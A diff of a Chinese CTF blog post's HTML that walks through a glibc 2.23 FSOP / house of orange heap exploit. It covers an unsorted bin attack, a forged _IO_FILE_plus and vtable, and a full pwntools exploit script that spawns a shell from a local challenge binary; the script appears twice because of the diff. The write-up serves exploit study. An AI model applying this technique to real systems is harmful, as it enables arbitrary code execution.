-<li>top chunk address+top chunk size满足页对齐<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>
+<li>top chunk address+top chunk size满足页对齐<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>
 之后再分割旧top chunk就不存在合并的问题了</li>
 </ul>
 <h5 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h5><p>这道题要进行unsorted bin attack有一个问题，就是在malloc之前必须free掉原来的chunk，但已经完成unsorted bin attack布置的堆块不能绕过_int_free中对unsorted bin中第一个chunk的连接检查</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bck = unsorted_chunks(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">	errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = unsorted_chunks(av);<br>fwd = bck-&gt;fd;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>&#123;<br>	errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>	<span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>倒推一下堆布局： </p>
 <ul>
-<li>由于我们需要放一个0x60的chunk（chunk2）到small bin里（后面再解释为什么），这个0x60的chunk同时也将用于unsorted bin attack，要绕开检查，unsorted bin中还得有一个chunk（chunk1），同时必须还有一个chunk在使用中（用于控制chunk2）<img src="/2023/02/20/FSOP/1.jpg" class title="步骤一"></li>
-<li>chunk1只能来自于free掉的chunk插入，如果是来自于切割那chunk2已经进入small bin（切割unsorted bin中的chunk只有一种情况，就是unsorted bin中仅有一个chunk且是last remainder） <img src="/2023/02/20/FSOP/2.jpg" class title="步骤二"> 
+<li>由于我们需要放一个0x60的chunk（chunk2）到small bin里（后面再解释为什么），这个0x60的chunk同时也将用于unsorted bin attack，要绕开检查，unsorted bin中还得有一个chunk（chunk1），同时必须还有一个chunk在使用中（用于控制chunk2）<img src="/2023/02/20/FSOP/1.jpg" srcset="/img/loading.gif" lazyload class title="步骤一"></li>
+<li>chunk1只能来自于free掉的chunk插入，如果是来自于切割那chunk2已经进入small bin（切割unsorted bin中的chunk只有一种情况，就是unsorted bin中仅有一个chunk且是last remainder） <img src="/2023/02/20/FSOP/2.jpg" srcset="/img/loading.gif" lazyload class title="步骤二"> 
 这样的话使用中的chunk必须在遍历unsorted bin之前就能得到。遍历unsorted bin之前会先在fastbin和small bin中找一样的，所以small bin中得有一个chunk<br>这样堆布局过程就很清楚了</li>
-<li>从unsorted bin中的旧top chunk中切割一个small chunk返回<img src="/2023/02/20/FSOP/3.jpg" class title="步骤三"> </li>
-<li>切割chunk2剩下一个0x60的chunk，返回剩下的，此时chunk1已进入small bin<img src="/2023/02/20/FSOP/4.jpg" class title="步骤四"></li>
+<li>从unsorted bin中的旧top chunk中切割一个small chunk返回<img src="/2023/02/20/FSOP/3.jpg" srcset="/img/loading.gif" lazyload class title="步骤三"> </li>
+<li>切割chunk2剩下一个0x60的chunk，返回剩下的，此时chunk1已进入small bin<img src="/2023/02/20/FSOP/4.jpg" srcset="/img/loading.gif" lazyload class title="步骤四"></li>
 <li>free使用的chunk进入unsorted bin，取走small bin中的chunk</li>
 </ul>
 <p>注意利用溢出覆盖next chunk的preinuse位为1防止合并</p>
 <h5 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h5><p>unsorted bin attack会将unsorted bin的地址写进_IO_list_all，main arena部分的空间是我们无法完全控制的，但如果我们free一个chunk进main arena中的fake _IO_FILE_plus-&gt;_chain部分，下一个_IO_FILE_plus就是我们能够控制的，可以算出chunk的大小应该是0x60，这就是上文需要free一个0x60的chunk进small bin的原因<br>_IO_flush_all_lockp中调用_IO_OVERFLOW的条件有：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>	   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>	       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	   )<br>	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>	result = EOF;<br></code></pre></td></tr></table></figure>
 <p>拆分一下两个条件</p>
 <ul>
-<li>&#96;&#96;&#96;c<br>fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  _IO_<span class="function"><span class="title">vtable_offset</span> (fp) == 0 &amp;&amp; fp-&gt;</span>_<span class="function"><span class="title">mode</span> &gt; 0 &amp;&amp; (fp-&gt;</span>_<span class="function"><span class="title">wide_data</span>-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> &gt; fp-&gt;</span>_<span class="function"><span class="title">wide_data</span>-&gt;</span>_IO_write_base)</span><br></pre></td></tr></table></figure>
+<li>&#96;&#96;&#96;c<br>fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br>* ```c<br>  _IO_<span class="hljs-function"><span class="hljs-title">vtable_offset</span> (fp) == 0 &amp;&amp; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &gt; 0 &amp;&amp; (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base)<br></code></pre></td></tr></table></figure>
 
-||的关系，满足其中一个就会调用_IO_OVERFLOW<br>main arena中的fake _IO_FILE_plus肯定不满足第一个条件中的 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<img src="/2023/02/20/FSOP/fake.png" class title="fake">
-第二个条件中 fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base肯定满足，fp-&gt;_mode &gt; 0有满足的可能性（不知道为什么实测没有判断IO_vtable_offset (fp) &#x3D;&#x3D; 0），需要爆破<br>布置在heap中的fake _IO_FILE_plus时要保证fp-&gt;_mode&lt;&#x3D;0（exp中设为-1），fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base（exp中分别设为1和0）并设置vtable指针，开头写’&#x2F;bin&#x2F;sh’<img src="/2023/02/20/FSOP/IO_FILE.png" class title="IO_FILE">
-设置跳转表<img src="/2023/02/20/FSOP/vtable.png" class title="vtable">
+||的关系，满足其中一个就会调用_IO_OVERFLOW<br>main arena中的fake _IO_FILE_plus肯定不满足第一个条件中的 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<img src="/2023/02/20/FSOP/fake.png" srcset="/img/loading.gif" lazyload class title="fake">
+第二个条件中 fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base肯定满足，fp-&gt;_mode &gt; 0有满足的可能性（不知道为什么实测没有判断IO_vtable_offset (fp) &#x3D;&#x3D; 0），需要爆破<br>布置在heap中的fake _IO_FILE_plus时要保证fp-&gt;_mode&lt;&#x3D;0（exp中设为-1），fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base（exp中分别设为1和0）并设置vtable指针，开头写’&#x2F;bin&#x2F;sh’<img src="/2023/02/20/FSOP/IO_FILE.png" srcset="/img/loading.gif" lazyload class title="IO_FILE">
+设置跳转表<img src="/2023/02/20/FSOP/vtable.png" srcset="/img/loading.gif" lazyload class title="vtable">
 这样执行_IO_OVERFLOW (fp, EOF)的时候实际执行的就是system(‘&#x2F;bin&#x2F;sh’)</li>
 </ul>
 <h5 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h5><p>用2.23-0ubuntu3_amd64版本的libc时程序会断在进入abort函数之前，调用栈如下：</p>
-<img src="/2023/02/20/FSOP/bt.png" class title="bt">
+<img src="/2023/02/20/FSOP/bt.png" srcset="/img/loading.gif" lazyload class title="bt">
 <p>中断原因是尝试写入不可写段</p>
 
-<img src="/2023/02/20/FSOP/vmmap.png" class title="vmmap">
+<img src="/2023/02/20/FSOP/vmmap.png" srcset="/img/loading.gif" lazyload class title="vmmap">
 <p>用2.23-0ubuntu11.3_amd64就没问题<br>换程序换触发错误方式都会有同样的问题，不知道为什么</p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input the size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input the content:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bye</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">new(<span class="number">0x200000</span>)<span class="comment">#libcbase</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode(),<span class="number">16</span>)+<span class="number">0x201000</span>-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">delete()</span><br><span class="line">new(<span class="number">0x200</span>)<span class="comment">#change the size of topchunk</span></span><br><span class="line">edit(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10df1</span>))</span><br><span class="line">delete()</span><br><span class="line">new(<span class="number">0x12000</span>)<span class="comment">#free topchunk(0x10fe0)</span></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">unsorted_bin=libcbase+<span class="number">0x68</span>+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">_IO_list_all=libcbase+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x200</span>)<span class="comment">#0x10dd0</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10dd1</span>)+p64(unsorted_bin)*<span class="number">2</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10db0</span>+p64(<span class="number">0x10dd0</span>)+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">new(<span class="number">0x10d60</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10d60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(unsorted_bin)*<span class="number">2</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x60</span>)+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">heap=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode(),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10d71</span>)+p64(heap+<span class="number">0x210</span>)+p64(unsorted_bin)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10d50</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#write base</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#write ptr</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc0</span>-<span class="number">48</span>)</span><br><span class="line">payload+=p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span>-<span class="number">8</span>-<span class="number">0xc0</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x11060</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(system)</span><br><span class="line">edit(payload)</span><br><span class="line">delete()</span><br><span class="line">gdb.attach(p)</span><br><span class="line">new(<span class="number">0xb00</span>)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;input the size:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;input the content:&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bye</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)<br>new(<span class="hljs-number">0x200000</span>)<span class="hljs-comment">#libcbase</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libcbase=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)+<span class="hljs-number">0x201000</span>-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>delete()<br>new(<span class="hljs-number">0x200</span>)<span class="hljs-comment">#change the size of topchunk</span><br>edit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x10df1</span>))<br>delete()<br>new(<span class="hljs-number">0x12000</span>)<span class="hljs-comment">#free topchunk(0x10fe0)</span><br>delete()<br><br>unsorted_bin=libcbase+<span class="hljs-number">0x68</span>+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>_IO_list_all=libcbase+libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>new(<span class="hljs-number">0x200</span>)<span class="hljs-comment">#0x10dd0</span><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x10dd1</span>)+p64(unsorted_bin)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10db0</span>+p64(<span class="hljs-number">0x10dd0</span>)+p64(<span class="hljs-number">0x11</span>)<br>edit(payload)<br><br>delete()<br>new(<span class="hljs-number">0x10d60</span>)<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10d60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x61</span>)+p64(unsorted_bin)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0x60</span>)+p64(<span class="hljs-number">0x11</span>)<br>edit(payload)<br><br>delete()<br>new(<span class="hljs-number">0x200</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>heap=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x10d71</span>)+p64(heap+<span class="hljs-number">0x210</span>)+p64(unsorted_bin)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10d50</span><br>payload+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="hljs-number">0x10</span>)<br>payload+=p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#write base</span><br>payload+=p64(<span class="hljs-number">1</span>)<span class="hljs-comment">#write ptr</span><br>payload+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0xc0</span>-<span class="hljs-number">48</span>)<br>payload+=p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>payload+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0xd8</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0xc0</span>)<br>payload+=p64(heap+<span class="hljs-number">0x11060</span>)<br>payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload+=p64(<span class="hljs-number">1</span>)<br>payload+=p64(system)<br>edit(payload)<br>delete()<br>gdb.attach(p)<br>new(<span class="hljs-number">0xb00</span>)<br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/pwn/" class="category-chain-item">pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/pwn/IO/" class="category-chain-item">IO</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/IO/" class="print-no-link">#IO</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>FSOP</div>
+      <div>http://akaieurus.github.io/2023/02/20/FSOP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年2月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/24/house-of-cat/" title="house of cat">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">house of cat</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" title="2.23 IO相关源码阅读笔记">
+                        <span class="hidden-mobile">2.23 IO相关源码阅读笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
     </div>
 
-    
-    
-    
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
